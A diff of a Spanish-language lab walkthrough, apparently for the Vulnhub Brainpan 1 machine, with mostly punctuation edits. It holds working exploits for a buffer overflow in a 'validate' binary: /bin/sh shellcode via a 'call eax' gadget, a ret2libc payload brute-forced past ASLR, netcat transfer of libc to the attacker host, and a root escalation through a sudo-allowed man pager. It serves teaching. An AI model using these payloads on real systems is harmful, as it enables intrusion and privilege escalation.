-<p class="plain-text">La iteración es para comparar el caracter actual con la <code class="language-plaintext highlighter-rouge">F</code>, si es igual muestra un mensaje con <code class="language-plaintext highlighter-rouge">printf</code> y sale con <code class="language-plaintext highlighter-rouge">exit</code>, si no es igual continua el bucle, cuando termina el bucle define un buffer en <code class="language-plaintext highlighter-rouge">ebp - 112</code> y llama a <code class="language-plaintext highlighter-rouge">strcpy</code> para copiar el argumento en ese buffer, resumiendo tenemos un Buffer Overflow y a <code class="language-plaintext highlighter-rouge">F</code> o <code class="language-plaintext highlighter-rouge">0x46</code> como badchar</p>
+<p class="plain-text">La iteración es para comparar el caracter actual con la <code class="language-plaintext highlighter-rouge">F</code>, si es igual muestra un mensaje con <code class="language-plaintext highlighter-rouge">printf</code> y sale con <code class="language-plaintext highlighter-rouge">exit</code>, si no es igual continua el bucle, cuando termina el bucle define un buffer en <code class="language-plaintext highlighter-rouge">ebp - 112</code> y llama a <code class="language-plaintext highlighter-rouge">strcpy</code> para copiar el argumento en ese buffer, resumiendo tenemos un Buffer Overflow y a <code class="language-plaintext highlighter-rouge">F</code> o <code class="language-plaintext highlighter-rouge">0x46</code> como badbyte.</p>
 <a href="/vulnhub/brainpan1/11.png" target="_blank"><div><p><img src="/vulnhub/brainpan1/11.png"></p></div></a>
 
-<p class="plain-text">Con <code class="language-plaintext highlighter-rouge">checksec</code> podemos ver que el binario no tiene ninguna <code class="language-plaintext highlighter-rouge">protección</code> a evitar</p>
+<p class="plain-text">Con <code class="language-plaintext highlighter-rouge">checksec</code> podemos ver que el binario no tiene ninguna <code class="language-plaintext highlighter-rouge">protección</code> a evitar.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">❯ checksec </span><span class="p">validate
 [</span><span class="az">*</span><span class="p">] '/home/user/validate'
@@ -1231,24 +789,24 @@ Connection received on 192.168.100.2  </span>
     RELRO:    </span><span class="am">Partial RELRO</span><span class="p">
     Stack:    </span><span class="ro">No canary found</span><span class="p">
     NX:       </span><span class="ro">NX disabled</span><span class="p">
-    PIE:      </span><span class="ro">No PIE (0x8048000)</span><span class="p">  
+    PIE:      </span><span class="ro">No PIE (0x8048000)</span><span class="p">
     RWX:      </span><span class="ro">Has RWX segments</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Iniciamos creando nuestro payload, llenaremos con <code class="language-plaintext highlighter-rouge">A's</code> los <code class="language-plaintext highlighter-rouge">112</code> bytes del buffer antes de <code class="language-plaintext highlighter-rouge">ebp</code>, luego enviamos <code class="language-plaintext highlighter-rouge">4 B's</code> para el valor que tomara <code class="language-plaintext highlighter-rouge">ebp</code> en el <code class="language-plaintext highlighter-rouge">leave</code>, luego <code class="language-plaintext highlighter-rouge">4 C's</code> del return address, además algunas <code class="language-plaintext highlighter-rouge">D's</code> que se guardarán en el stack</p>
+<p class="plain-text">Iniciamos creando nuestro payload, llenaremos con <code class="language-plaintext highlighter-rouge">A's</code> los <code class="language-plaintext highlighter-rouge">112</code> bytes del buffer antes de <code class="language-plaintext highlighter-rouge">ebp</code>, luego enviamos <code class="language-plaintext highlighter-rouge">4 B's</code> para el valor que tomará <code class="language-plaintext highlighter-rouge">ebp</code> en el <code class="language-plaintext highlighter-rouge">leave</code>, luego <code class="language-plaintext highlighter-rouge">4 C's</code> del return address, además algunas <code class="language-plaintext highlighter-rouge">D's</code> que se guardarán en el stack.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">❯ python3 </span><span class="p">-q
 >>> b"A" * 112 + b"B" * 4 + b"C" * 4 + b"D" * 40
-b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD'  
+b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD'
 >>></span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Enviamos el payload como el argumento y podemos ver que nuestra hipotesis se cumple ya que el eip apunta a <code class="language-plaintext highlighter-rouge">0x43434343</code>, concluimos que el offset para el return address es de <code class="language-plaintext highlighter-rouge">116</code> bytes y el resto de los bytes osea las <code class="language-plaintext highlighter-rouge">D's</code> se guardan en el stack</p>
+<p class="plain-text">Enviamos el payload como el argumento y podemos ver que nuestra hipótesis se cumple ya que el eip apunta a <code class="language-plaintext highlighter-rouge">0x43434343</code>, concluimos que el offset para el return address es de <code class="language-plaintext highlighter-rouge">116</code> bytes y el resto de los bytes, oséa las <code class="language-plaintext highlighter-rouge">D's</code> se guardan en el stack.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">❯ gdb </span><span class="p">-q validate
 Reading symbols from </span><span class="ve">validate</span><span class="p">...
 </span><span class="ro">pwndbg> </span><span class="p">run AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD
-Starting program: </span><span class="ve">/home/user/validate</span><span class="p"> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD  
+Starting program: </span><span class="ve">/home/user/validate</span><span class="p"> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD
 [Depuración de hilo usando libthread_db enabled]
 Using host libthread_db library "</span><span class="ve">/lib/x86_64-linux-gnu/libthread_db.so.1</span><span class="p">".
 
@@ -1263,9 +821,9 @@ Program received signal SIGSEGV, Segmentation fault.
 </span><span class="ro">pwndbg></span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Podriamos intentar una explotación parecida a la del binario <code class="language-plaintext highlighter-rouge">brainpan.exe</code> pero en este caso si queremos saltar al <code class="language-plaintext highlighter-rouge">esp</code> no hay ningun gadget de <code class="language-plaintext highlighter-rouge">jmp esp</code> o equivalente</p>
+<p class="plain-text">Podríamos intentar una explotación parecida a la del binario <code class="language-plaintext highlighter-rouge">brainpan.exe</code> pero en este caso si queremos saltar al <code class="language-plaintext highlighter-rouge">esp</code> no hay ningún gadget de <code class="language-plaintext highlighter-rouge">jmp esp</code> o parecido.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">❯ ropper </span><span class="p">--file validate --jmp esp  
+<code><span class="ve">❯ ropper </span><span class="p">--file validate --jmp esp
 
 JMP Instructions
 ================
@@ -1273,16 +831,16 @@ JMP Instructions
 0 gadgets found</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Podemos aprovecharnos del hecho de que <code class="language-plaintext highlighter-rouge">strcpy</code> como return value devuelve un puntero al buffer de destino, por lo que en <code class="language-plaintext highlighter-rouge">eax</code> que es donde se guarda el valor de retorno deberiamos tener una dirección que apunta al inicio de nuestro buffer</p>
+<p class="plain-text">Podemos aprovecharnos del hecho de que <code class="language-plaintext highlighter-rouge">strcpy</code> como return value devuelve un puntero al buffer de destino, por lo que en <code class="language-plaintext highlighter-rouge">eax</code> que es donde se guarda el valor de retorno deberiamos tener una dirección que apunta al inicio de nuestro buffer.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ro">pwndbg></span><span class="p"> x/s $eax
-</span><span class="az">0xffffd7c8</span><span class="p">:     'A' &ltrepetidos 112 veces>, "BBBBCCCC", 'D' &ltrepetidos 40 veces>  
+</span><span class="az">0xffffd7c8</span><span class="p">:     'A' &ltrepetidos 112 veces>, "BBBBCCCC", 'D' &ltrepetidos 40 veces>
 </span><span class="ro">pwndbg></span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Si miramos con <code class="language-plaintext highlighter-rouge">ropper</code> direcciones a donde podemos saltar encontramos 2 instrucciones que nos ejecutan <code class="language-plaintext highlighter-rouge">call eax</code>, con lo que volveriamos al inicio del <code class="language-plaintext highlighter-rouge">input</code></p>
+<p class="plain-text">Si miramos con <code class="language-plaintext highlighter-rouge">ropper</code> direcciones a donde podemos saltar encontramos 2 instrucciones que ejecutan <code class="language-plaintext highlighter-rouge">call eax</code>, con lo que volveríamos al inicio del <code class="language-plaintext highlighter-rouge">input</code>.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">❯ ropper </span><span class="p">--file validate --jmp eax  
+<code><span class="ve">❯ ropper </span><span class="p">--file validate --jmp eax
 
 JMP Instructions
 ================
@@ -1293,19 +851,19 @@ JMP Instructions
 2 gadgets found</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Cualquiera de las 2 direcciones para <code class="language-plaintext highlighter-rouge">call eax</code> es válida pero hay que pasarla a formato <code class="language-plaintext highlighter-rouge">little endian</code>, como no tenemos <code class="language-plaintext highlighter-rouge">pwntools</code> en la maquina crearemos una funcion llamada <code class="language-plaintext highlighter-rouge">p32</code> usando el propio atributo <code class="language-plaintext highlighter-rouge">.to_bytes()</code> para convertirla</p>
+<p class="plain-text">Cualquiera de las 2 direcciones para <code class="language-plaintext highlighter-rouge">call eax</code> es válida pero hay que pasarla a formato <code class="language-plaintext highlighter-rouge">little endian</code>, como no tenemos <code class="language-plaintext highlighter-rouge">pwntools</code> en la maquina crearemos una funcion llamada <code class="language-plaintext highlighter-rouge">p32</code> usando el propio atributo <code class="language-plaintext highlighter-rouge">.to_bytes()</code> para convertirla.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="p">p32 </span><span class="o">= lambda</span><span class="ra"> addr</span><span class="p">: addr.to_bytes(</span><span class="mi">4</span><span class="p">,</span><span class="s"> "little"</span><span class="p">)  </span>
+<code><span class="p">p32 </span><span class="o">= lambda</span><span class="ra"> addr</span><span class="p">: addr.to_bytes(</span><span class="mi">4</span><span class="p">,</span><span class="s"> "little"</span><span class="p">)</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Iniciamos con un <a href="https://github.com/xchg2pwn/BinaryExploitation/blob/main/shellcode/bin_sh.asm">shellcode</a> el cual nos ejecutara una <code class="language-plaintext highlighter-rouge">/bin/sh</code>, rellenamos con <code class="language-plaintext highlighter-rouge">A's</code> hasta llegar al return address, en el ejecutaremos el <code class="language-plaintext highlighter-rouge">call eax</code> que llama al inicio del buffer y como en el inicio enviamos el shellcode se ejecutará y nos dará la shell</p>
+<p class="plain-text">Iniciamos con un <a href="https://github.com/xchg2pwn/BinaryExploitation/blob/main/shellcode/bin_sh.asm">shellcode</a> el cual nos ejecutará una <code class="language-plaintext highlighter-rouge">/bin/sh</code>, rellenamos con <code class="language-plaintext highlighter-rouge">A's</code> hasta llegar al return address, en el ejecutaremos el <code class="language-plaintext highlighter-rouge">call eax</code> que llama al inicio del buffer, como en el inicio enviamos el shellcode se ejecutará y nos dará la shell.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="c1">#!/usr/bin/python3
 </span><span class="o">import</span><span class="p"> sys
 
 p32</span><span class="o"> = lambda</span><span class="ra"> addr</span><span class="p">: addr.to_bytes(</span><span class="mi">4</span><span class="p">,</span><span class="s"> "little"</span><span class="p">)
 
-shellcode</span><span class="o"> =</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x6a\x0b\x58\x6a\x68\x66\x68\x2f\x73\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x99\xcd\x80</span><span class="s">"  </span><span class="p">
+shellcode</span><span class="o"> =</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x6a\x0b\x58\x6a\x68\x66\x68\x2f\x73\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x99\xcd\x80</span><span class="s">"</span><span class="p">
 
 offset</span><span class="o"> =</span><span class="mi"> 116</span><span class="p">
 junk</span><span class="o"> =</span><span class="no"> b</span><span class="s">"A"</span><span class="o"> *</span><span class="p"> (offset </span><span class="o">- </span><span class="no">len</span><span class="p">(shellcode))
@@ -1318,9 +876,9 @@ payload</span><span class="o"> +=</span><span class="p"> p32(</span><span class=
 sys.stdout.buffer.write(payload)</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Ejecutamos el binario <code class="language-plaintext highlighter-rouge">validate</code> en la máquina victima con el exploit ejecutado como <code class="language-plaintext highlighter-rouge">validate</code>, al hacerlo conseguimos una <code class="language-plaintext highlighter-rouge">shell</code> como el usuario <code class="language-plaintext highlighter-rouge">anansi</code></p>
+<p class="plain-text">Ejecutamos el binario <code class="language-plaintext highlighter-rouge">validate</code> en la máquina victima con el exploit ejecutado como <code class="language-plaintext highlighter-rouge">validate</code>, al hacerlo conseguimos una <code class="language-plaintext highlighter-rouge">shell</code> como el usuario <code class="language-plaintext highlighter-rouge">anansi</code>.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">puck@brainpan</span><span class="p">:</span><span class="az">~</span><span class="p">$ validate $(python2 exploit.py)  
+<code><span class="ve">puck@brainpan</span><span class="p">:</span><span class="az">~</span><span class="p">$ validate $(python2 exploit.py)
 $ whoami
 anansi
 $ hostname -I
@@ -1328,49 +886,49 @@ $ hostname -I
 $</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Otro metodo es explotarlo mediante un <code class="language-plaintext highlighter-rouge">ret2libc</code>, para esto necesitamos saber la libreria que usa el binario que en este caso con <code class="language-plaintext highlighter-rouge">ldd</code> vemos que es <code class="language-plaintext highlighter-rouge">libc.so.6</code></p>
+<p class="plain-text">Otro método es explotarlo mediante un <code class="language-plaintext highlighter-rouge">ret2libc</code>, para esto necesitamos saber la libreria que usa el binario que en este caso con <code class="language-plaintext highlighter-rouge">ldd</code> vemos que es <code class="language-plaintext highlighter-rouge">libc.so.6</code>.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">puck@brainpan</span><span class="p">:</span><span class="az">~</span><span class="p">$ ldd /usr/local/bin/validate  
 	linux-gate.so.1 =>  (0xb77d5000)
-	libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7621000)  
+	libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7621000)
 	/lib/ld-linux.so.2 (0xb77d6000)
 </span><span class="ve">puck@brainpan</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Descargamos el archivo <code class="language-plaintext highlighter-rouge">libc.so.6</code> con <code class="language-plaintext highlighter-rouge">netcat</code> de la misma manera que antes</p>
+<p class="plain-text">Descargamos el archivo <code class="language-plaintext highlighter-rouge">libc.so.6</code> con <code class="language-plaintext highlighter-rouge">netcat</code> de la misma manera que antes.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">puck@brainpan</span><span class="p">:</span><span class="az">~</span><span class="p">$ netcat 10.8.64.87 4444 < /lib/i386-linux-gnu/libc.so.6  
+<code><span class="ve">puck@brainpan</span><span class="p">:</span><span class="az">~</span><span class="p">$ netcat 192.168.100.73 4444 < /lib/i386-linux-gnu/libc.so.6
 </span><span class="ve">puck@brainpan</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
 </code></pre></div></div><br>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">❯ netcat</span><span class="p"> -lvnp 4444 > libc.so.6  
+<code><span class="ve">❯ netcat</span><span class="p"> -lvnp 4444 > libc.so.6
 Listening on 0.0.0.0 4444
-Connection received on 10.10.27.47  </span>
+Connection received on 192.168.100.2</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Para empezar tomaremos como <code class="language-plaintext highlighter-rouge">base</code> una dirección de <code class="language-plaintext highlighter-rouge">libc</code> usando <code class="language-plaintext highlighter-rouge">ldd</code></p>
+<p class="plain-text">Para empezar tomaremos como <code class="language-plaintext highlighter-rouge">base</code> una dirección de <code class="language-plaintext highlighter-rouge">libc</code> usando <code class="language-plaintext highlighter-rouge">ldd</code>.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">puck@brainpan</span><span class="p">:</span><span class="az">~</span><span class="p">$ ldd /usr/local/bin/validate
         linux-gate.so.1 =>  (0xb7719000)
-        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7565000)  
+        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7565000)
         /lib/ld-linux.so.2 (0xb771a000)
 </span><span class="ve">puck@brainpan</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Ahora con <code class="language-plaintext highlighter-rouge">readelf</code> conseguimos <code class="language-plaintext highlighter-rouge">offsets</code> de las direcciones para <code class="language-plaintext highlighter-rouge">exit</code> y <code class="language-plaintext highlighter-rouge">system</code></p>
+<p class="plain-text">Ahora con <code class="language-plaintext highlighter-rouge">readelf</code> conseguimos <code class="language-plaintext highlighter-rouge">offsets</code> de las direcciones para <code class="language-plaintext highlighter-rouge">exit</code> y <code class="language-plaintext highlighter-rouge">system</code>.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">❯ readelf</span><span class="p"> -s libc.so.6 | </span><span class="ve">grep</span><span class="p"> -E </span><span class="am">" system@@| exit@@"</span><span class="p">
    136: 00032fb0    45 FUNC    GLOBAL DEFAULT   12 </span><span class="ro">exit@@</span><span class="p">GLIBC_2.0
-  1422: 0003f430   141 FUNC    WEAK   DEFAULT   12 </span><span class="ro">system@@</span><span class="p">GLIBC_2.0  </span>
+  1422: 0003f430   141 FUNC    WEAK   DEFAULT   12 </span><span class="ro">system@@</span><span class="p">GLIBC_2.0</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Para conseguir un <code class="language-plaintext highlighter-rouge">offset</code> de la dirección de <code class="language-plaintext highlighter-rouge">/bin/sh</code> podemos usar <code class="language-plaintext highlighter-rouge">strings</code></p>
+<p class="plain-text">Para conseguir un <code class="language-plaintext highlighter-rouge">offset</code> de la dirección de <code class="language-plaintext highlighter-rouge">/bin/sh</code> podemos usar <code class="language-plaintext highlighter-rouge">strings</code>.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">❯ strings </span><span class="p">-a -t x libc.so.6 | </span><span class="ve">grep</span><span class="p"> /bin/sh  
+<code><span class="ve">❯ strings </span><span class="p">-a -t x libc.so.6 | </span><span class="ve">grep</span><span class="p"> /bin/sh
  160f58 </span><span class="ro">/bin/sh</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">El exploit rellena con <code class="language-plaintext highlighter-rouge">A's</code> el offset hasta el return address, ahí llama a la función <code class="language-plaintext highlighter-rouge">system</code> y el primer dword del stack que pertenece al siguiente return address cuando termine <code class="language-plaintext highlighter-rouge">system</code> lo define como <code class="language-plaintext highlighter-rouge">exit</code>, luego como argumento para system que se encuentra en el segundo dword del stack envia la dirección de <code class="language-plaintext highlighter-rouge">/bin/sh</code></p>
+<p class="plain-text">El exploit rellena con <code class="language-plaintext highlighter-rouge">A's</code> el offset hasta el return address, ahí llama a la función <code class="language-plaintext highlighter-rouge">system</code> y el primer dword del stack que pertenece al siguiente return address cuando termine <code class="language-plaintext highlighter-rouge">system</code> lo define como <code class="language-plaintext highlighter-rouge">exit</code>, luego como argumento para system que se encuentra en el segundo dword del stack envia la dirección de <code class="language-plaintext highlighter-rouge">/bin/sh</code>.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="c1">#!/usr/bin/python3
 </span><span class="o">import</span><span class="p"> sys
@@ -1386,34 +944,34 @@ payload</span><span class="o">  =</span><span class="no"> b</span><span class="s
 payload</span><span class="o"> +=</span><span class="p"> junk
 payload</span><span class="o"> +=</span><span class="p"> p32(libc_base </span><span class="o">+</span><span class="mi"> 0x03f430</span><span class="p">)</span><span class="c1"> # system()</span><span class="p">
 payload</span><span class="o"> +=</span><span class="p"> p32(libc_base </span><span class="o">+</span><span class="mi"> 0x032fb0</span><span class="p">)</span><span class="c1"> # exit()</span><span class="p">
-payload</span><span class="o"> +=</span><span class="p"> p32(libc_base </span><span class="o">+</span><span class="mi"> 0x160f58</span><span class="p">)</span><span class="c1"> # "/bin/sh"</span><span class="p">  
+payload</span><span class="o"> +=</span><span class="p"> p32(libc_base </span><span class="o">+</span><span class="mi"> 0x160f58</span><span class="p">)</span><span class="c1"> # "/bin/sh"</span><span class="p">
 
 sys.stdout.buffer.write(payload)</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Sin embargo tenemos un problema y es que la dirección de <code class="language-plaintext highlighter-rouge">libc base</code> cambia constantemente, esto es porque el <code class="language-plaintext highlighter-rouge">ASLR</code> esta activado y hay aleatorizacion</p>
+<p class="plain-text">Sin embargo tenemos un problema y es que la dirección de <code class="language-plaintext highlighter-rouge">libc base</code> cambia constantemente, esto es porque el <code class="language-plaintext highlighter-rouge">ASLR</code> esta activado y hay aleatorizacion.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">puck@brainpan</span><span class="p">:</span><span class="az">~</span><span class="p">$ ldd /usr/local/bin/validate 
     linux-gate.so.1 =>  (0xb77ce000)
-    libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb761a000)  
+    libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb761a000)
     /lib/ld-linux.so.2 (0xb77cf000)
 </span><span class="ve">puck@brainpan</span><span class="p">:</span><span class="az">~</span><span class="p">$ cat /proc/sys/kernel/randomize_va_space
 2
 </span><span class="ve">puck@brainpan</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Sin embargo en <code class="language-plaintext highlighter-rouge">x86</code> las direcciones son tan <code class="language-plaintext highlighter-rouge">pequeñas</code> que despues de ejecutar el binario varias veces la dirección de libc <code class="language-plaintext highlighter-rouge">base</code> vuelve a <code class="language-plaintext highlighter-rouge">coincidir</code> varias veces</p>
+<p class="plain-text">Sin embargo en <code class="language-plaintext highlighter-rouge">x86</code> las direcciones son tan <code class="language-plaintext highlighter-rouge">pequeñas</code> que después de ejecutar el binario varias veces la dirección de libc <code class="language-plaintext highlighter-rouge">base</code> vuelve a <code class="language-plaintext highlighter-rouge">coincidir</code> varias veces.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">puck@brainpan</span><span class="p">:</span><span class="az">~</span><span class="p">$ for i in $(seq 1 1000); do ldd /usr/local/bin/validate | grep 0xb7565000; done  
+<code><span class="ve">puck@brainpan</span><span class="p">:</span><span class="az">~</span><span class="p">$ for i in $(seq 1 1000); do ldd /usr/local/bin/validate | grep 0xb7565000; done
 	libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (</span><span class="ro">0xb7565000</span><span class="p">)
 	libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (</span><span class="ro">0xb7565000</span><span class="p">)
 	libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (</span><span class="ro">0xb7565000</span><span class="p">)
 </span><span class="ve">puck@brainpan</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Asi que es caso de ejecutarlo en <code class="language-plaintext highlighter-rouge">bucle</code> hasta que consigamos una sh como <code class="language-plaintext highlighter-rouge">anansi</code></p>
+<p class="plain-text">Asi que es caso de ejecutarlo en <code class="language-plaintext highlighter-rouge">bucle</code> hasta que consigamos una sh como <code class="language-plaintext highlighter-rouge">anansi</code>.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">puck@brainpan</span><span class="p">:</span><span class="az">~</span><span class="p">$ while true; do validate $(python3 exploit.py); done  
+<code><span class="ve">puck@brainpan</span><span class="p">:</span><span class="az">~</span><span class="p">$ while true; do validate $(python3 exploit.py); done
 Segmentation fault
 Segmentation fault
 Segmentation fault
@@ -1423,18 +981,17 @@ $ hostname -I
 10.10.27.47
 $</span>
 </code></pre></div></div><br>
-</section>
 
 </section>
 
 <section class="post" id="shell-root">
 <br><h3 class="post-title">Shell - root</h3><br>
 
-<p class="plain-text">A nivel de <code class="language-plaintext highlighter-rouge">sudoers</code> podemos ejecutar como <code class="language-plaintext highlighter-rouge">root</code> sin contraseña <code class="language-plaintext highlighter-rouge">anansi_util</code></p>
+<p class="plain-text">A nivel de <code class="language-plaintext highlighter-rouge">sudoers</code> podemos ejecutar como <code class="language-plaintext highlighter-rouge">root</code> sin contraseña <code class="language-plaintext highlighter-rouge">anansi_util</code>.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="p">$ sudo -l
 Matching Defaults entries for anansi on this host:
-    secure_path=/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin  
+    secure_path=/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
 
 User puck may run the following commands on this host:
     (root) NOPASSWD: /home/anansi/bin/anansi_util
@@ -1447,7 +1004,7 @@ Where [action] is one of:
 $</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Tenemos varias opciones entre ellas <code class="language-plaintext highlighter-rouge">manual</code>, podemos desplegar el manual del comando <code class="language-plaintext highlighter-rouge">whoami</code> y entra en un modo <code class="language-plaintext highlighter-rouge">paginate</code>, ejecutamos <code class="language-plaintext highlighter-rouge">!bash</code> y somos root</p>
+<p class="plain-text">Tenemos varias opciones entre ellas <code class="language-plaintext highlighter-rouge">manual</code>, podemos desplegar el manual del comando <code class="language-plaintext highlighter-rouge">whoami</code> y entra en un modo <code class="language-plaintext highlighter-rouge">paginate</code>, ejecutamos <code class="language-plaintext highlighter-rouge">!bash</code> y somos root.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="p">$ sudo /home/anansi/bin/anansi_util manual whoami
 
@@ -1458,7 +1015,7 @@ SYNOPSIS
        whoami [OPTION]...
 
 DESCRIPTION
-       Print the user name associated with the current effective user ID  
+       Print the user name associated with the current effective user ID
 
        --help display this help and exit
 
@@ -1476,25 +1033,25 @@ uid=0(root) gid=0(root) groups=0(root)
 10.10.27.47
 </span><span class="ve">root@brainpan</span><span class="p">:</span><span class="az">/usr/share/man</span><span class="p"># cat /root/b.txt 
 
-_|                            _|                                        
-_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
+_|                            _|  
+_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|
 _|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
 _|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
 _|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
-                                            _|                          
+                                            _|
                                             _|
 
 
-                                              http://www.techorganic.com  
+                                              http://www.techorganic.com
 
 </span><span class="ve">root@brainpan</span><span class="p">:</span><span class="az">/usr/share/man</span><span class="p">#</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Es necesario mencionar que el <code class="language-plaintext highlighter-rouge">Buffer Overflow</code> de la escalada es opcional ya que a nivel de sudoers de <code class="language-plaintext highlighter-rouge">puck</code> tenemos el binario <code class="language-plaintext highlighter-rouge">anansi_util</code> que teniamos antes, asi que solo repetimos el proceso y conseguimos una shell como el usuario <code class="language-plaintext highlighter-rouge">root</code></p>
+<p class="plain-text">Es necesario mencionar que el <code class="language-plaintext highlighter-rouge">Buffer Overflow</code> de la escalada es opcional ya que a nivel de sudoers de <code class="language-plaintext highlighter-rouge">puck</code> tenemos el binario <code class="language-plaintext highlighter-rouge">anansi_util</code> que vimos antes, así que solo repetimos el proceso y conseguimos una shell como el usuario <code class="language-plaintext highlighter-rouge">root</code>.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">puck@brainpan</span><span class="p">:</span><span class="az">~</span><span class="p">$ sudo -l
 Matching Defaults entries for puck on this host:
-    secure_path=/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin  
+    secure_path=/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
 
 User puck may run the following commands on this host:
     (root) NOPASSWD: /home/anansi/bin/anansi_util
@@ -1507,7 +1064,7 @@ SYNOPSIS
        whoami [OPTION]...
 
 DESCRIPTION
-       Print the user name associated with the current effective user ID  
+       Print the user name associated with the current effective user ID
 
        --help display this help and exit
 
@@ -1525,16 +1082,16 @@ uid=0(root) gid=0(root) groups=0(root)
 10.10.27.47
